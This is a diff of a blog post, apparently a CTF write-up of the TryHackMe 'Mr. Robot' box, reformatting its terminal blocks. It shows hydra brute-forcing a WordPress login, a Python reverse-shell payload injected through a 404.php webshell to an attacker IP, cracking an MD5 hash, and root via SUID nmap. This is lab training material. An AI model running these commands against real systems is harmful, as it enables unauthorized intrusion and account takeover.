@@ -27,8 +27,7 @@ Here we go taking on Mr. Robot.  Hope you enjoy the ride.
 
 The nmaps didn't seem to work on this one.  So, we will skip it and get on with exploritizing.  Run curl -I to get the headers to try and fingerprint the technology.
 
-{% raw %}
-```sh
+{% capture curli %}
 ┌──(kali㉿kali)-[~/Documents/thm/mrrobot]
 └─$ curl -I http://10.10.11.55 
 HTTP/1.1 200 OK
@@ -41,14 +40,13 @@ X-Mod-Pagespeed: 1.9.32.3-4523
 Cache-Control: max-age=0, no-cache
 Content-Length: 1188
 Content-Type: text/html
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=curli %}
 
 <br />
 And curl -I against port 443 just to ensure that it is the same.
 
-{% raw %}
-```sh
+{% capture curli443 %}
 ┌──(kali㉿kali)-[~/Documents/thm/mrrobot]
 └─$ curl -I https://10.10.11.55 -k
 HTTP/1.1 200 OK
@@ -61,14 +59,13 @@ X-Mod-Pagespeed: 1.9.32.3-4523
 Cache-Control: max-age=0, no-cache
 Content-Length: 1077
 Content-Type: text/html
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=curli443 %}
 
 <br />
 Run ffuf against the port 80 website to try to find any interesting directories or files.
 
-{% raw %}
-```sh
+{% capture ffuf %}
 ┌──(kali㉿kali)-[~/Documents/thm/mrrobot]
 └─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.55/FUZZ -e .txt,.bak,.html,.php -fw 189
 
@@ -130,8 +127,8 @@ robots                  [Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 31
 dashboard               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2879ms]
 %20                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 3280ms]
 [WARN] Caught keyboard interrupt (Ctrl-C)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=ffuf %}
 
 <br />
 Check the wp-login.php page to give it a look.
@@ -145,8 +142,7 @@ Check the wp-login.php page to give it a look.
 <br />
 Run wpscan to enumerate the users.
 
-{% raw %}
-```sh
+{% capture wpscan %}
 ┌──(kali㉿kali)-[~/Documents/thm/mrrobot]
 └─$ wpscan --url http://10.10.11.55 --enumerate u  
 _______________________________________________________________
@@ -235,25 +231,23 @@ Interesting Finding(s):
 [+] Data Received: 279.021 KB
 [+] Memory used: 240.48 MB
 [+] Elapsed time: 00:01:50
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=wpscan %}
 
 <br />
 Check the robots.txt file.
 
-{% raw %}
-```sh
+{% capture robottxt %}
 User-agent: *
 fsocity.dic
 key-1-of-3.txt
-```
-{% endraw %}
+{% endcapture %}
+{% include codebox.html title="Config File Example" content=robottxt %}
 
 <br />
 Download the two files that are indicated in the file.
 
-{% raw %}
-```sh
+{% capture downloadfiles %}
 ┌──(kali㉿kali)-[~/Documents/thm/mrrobot]
 └─$ curl http://10.10.11.55/key-1-of-3.txt -o key-1-of-3.txt
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -265,17 +259,22 @@ Download the two files that are indicated in the file.
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100 7075k  100 7075k    0     0   557k      0  0:00:12  0:00:12 --:--:-- 1255k
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadfiles %}
 
 <br />
 Get the first flag.
 
-{% raw %}
-```sh
+{% capture firstflag %}
 ┌──(kali㉿kali)-[~/Documents/thm/mrrobot]
 └─$ curl http://10.10.11.55/key-1-of-3.txt         
 <redacted>
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=firstflag %}
+
+{% raw %}
+```sh
+
 ```
 {% endraw %}
 
@@ -291,8 +290,7 @@ Get the login request in the Network tab of the devloper's tools.  We can note t
 <br />
 Use the hydra program and the fsociety.dic dictionary to try and brute-force the username.
 
-{% raw %}
-```sh
+{% capture hydrawpuser %}
 ┌──(kali㉿kali)-[~/Documents/thm/mrrobot]
 └─$ hydra -L fsocity.dic -p admin 10.10.11.55 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.11.55%2Fwp-admin%2F&testcookie=1:Invalid Username"
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -303,8 +301,8 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-09 14:59:
 [80][http-post-form] host: 10.10.11.55   login: Elliot   password: admin
 [STATUS] 112.00 tries/min, 112 tries in 00:01h, 858123 to do in 127:42h, 16 active
 ^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=hydrawpuser %}
 
 <br />
 View the request with the valid username to get an updated failure phrase.
@@ -318,8 +316,7 @@ View the request with the valid username to get an updated failure phrase.
 <br />
 Run hydra again to search for the password so we can have a valid login set.
 
-{% raw %}
-```sh
+{% capture hydrawppass %}
 ┌──(kali㉿kali)-[~/Documents/thm/mrrobot]
 └─$ hydra -l Elliot -P fsocity.dic 10.10.145.112 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.11.55%2Fwp-admin%2F&testcookie=1:The password you entered"
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -330,8 +327,8 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-09 18:01:
 [80][http-post-form] host: 10.10.145.112   login: Elliot   password: ER28-0652
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-09 18:02:20
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=hydrawppass %}
 
 <br />
 Test the credentials and login into the wordpress instance.
@@ -372,13 +369,12 @@ Navigate to the 404.php file and give it ls to test the command execution.
 <br />
 Start a listener that listens on port 4444.
 
-{% raw %}
-```sh
+{% capture startlistener %}
 ┌──(kali㉿kali)-[~/Documents/thm/mrrobot]
 └─$ nc -nlvp 4444 
 listening on [any] 4444 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=startlistener %}
 
 <br />
 Use revshells to get a python one-liner exploit.
@@ -392,17 +388,16 @@ Use revshells to get a python one-liner exploit.
 <br />
 Inject the Revshells payload into the cmd parameter.  Restart the victim machine if you ever run out of time.
 
-{% raw %}
-```sh
+{% capture triggerpayload %}
 http://10.10.145.112/wp-content/themes/twentyfifteen/404.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.4.119.29%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=triggerpayload %}
+
 
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```sh
+{% capture catchshell %}
 ┌──(kali㉿kali)-[~/Documents/thm/mrrobot]
 └─$ nc -nlvp 4444 
 listening on [any] 4444 ...
@@ -410,25 +405,29 @@ connect to [10.4.119.29] from (UNKNOWN) [10.10.145.112] 60036
 $ python3 -c 'import pty; pty.spawn("/bin/bash");'
 python3 -c 'import pty; pty.spawn("/bin/bash");'
 </wordpress/htdocs/wp-content/themes/twentyfifteen$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchshell %}
 
 <br />
 Check the password.raw-md5 file to get the password hash.
 
-{% raw %}
-```sh
+{% capture catpwfile %}
 daemon@linux:/home/robot$ cat password.raw-md5
 cat password.raw-md5
+{% endcapture %}
+
+{% capture pwfile %}
 robot:c3fcd3d76192e4007dfb496cca67e13b
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catpwfile %}
+
+{% include codebox.html title="Config File Example" content=pwfile %}
 
 <br />
 Use john the ripper to crack the password hash.
 
-{% raw %}
-```sh
+{% capture johnpass %}
 ┌──(kali㉿kali)-[~/Documents/thm/mrrobot]
 └─$ john --wordlist=/home/kali/Documents/htb/metatwo/hashkiller24.txt --format=raw-md5 password.raw-md5
 Using default input encoding: UTF-8
@@ -439,25 +438,23 @@ abcdefghijklmnopqrstuvwxyz (robot)
 1g 0:00:00:05 DONE (2025-02-09 16:00) 0.1721g/s 11515Kp/s 11515Kc/s 11515KC/s abcdefghijklmnop123secret..ABCDEFGHILMNOPQRSTUVZ
 Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
 Session completed.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=johnpass %}
 
 <br />
 Use the new password to switch user into the robot user.
 
-{% raw %}
-```sh
+{% capture surobot %}
 </wordpress/htdocs/wp-content/themes/twentyfifteen$ su robot 
 su robot
 Password: abcdefghijklmnopqrstuvwxyz
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=surobot %}
 
 <br />
 Snag that second flag.  See that.  It rhymed.
 
-{% raw %}
-```sh
+{% capture secondflag %}
 robot@linux:~$ cat key-2-of-3.txt
 cat key-2-of-3.txt
 <redacted>
@@ -475,21 +472,20 @@ ip a
        valid_lft forever preferred_lft forever
     inet6 fe80::56:d1ff:fe80:13d1/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=secondflag %}
 
 <br />
 Try sudo -l to see what we can run as sudo.  Nothing.
 
-{% raw %}
-```sh
+{% capture sudol %}
 robot@linux:~$ sudo -l
 sudo -l
 [sudo] password for robot: abcdefghijklmnopqrstuvwxyz
 
 Sorry, user robot may not run sudo on linux.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sudol %}
 
 <br />
 Check the g0tmi1k Linux privilege escalation blog.
@@ -504,8 +500,7 @@ Check the g0tmi1k Linux privilege escalation blog.
 <br />
 Run the command to get a list of the SUID stick bit programs.  Hey, nmap!  Easy.
 
-{% raw %}
-```sh
+{% capture suid %}
 robot@linux:/dev/shm$ find / -perm -u=s -type f 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
 /bin/ping
@@ -525,8 +520,8 @@ find / -perm -u=s -type f 2>/dev/null
 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
 /usr/lib/pt_chown
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=suid %}
 
 <br />
 I have done this in the past but we will check the GTFOBins just to double-check.
@@ -541,8 +536,7 @@ I have done this in the past but we will check the GTFOBins just to double-check
 <br />
 Enter into nmap interactive mode and drop into a shell.
 
-{% raw %}
-```sh
+{% capture nmaproot %}
 Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
 Welcome to Interactive Mode -- press h <enter> for help
 nmap> !sh 
@@ -550,14 +544,13 @@ nmap> !sh
 # whoami
 whoami
 root
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmaproot %}
 
 <br />
 Get the last flag.
 
-{% raw %}
-```sh
+{% capture lastflag %}
 # cat key-3-of-3.txt
 cat key-3-of-3.txt
 <redacted>
@@ -575,8 +568,8 @@ ip a
        valid_lft forever preferred_lft forever
     inet6 fe80::f7:48ff:febe:30fd/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=lastflag %}
 
 <br />
 Domo Arigato Mr. Roboto!  Thanks for the box!
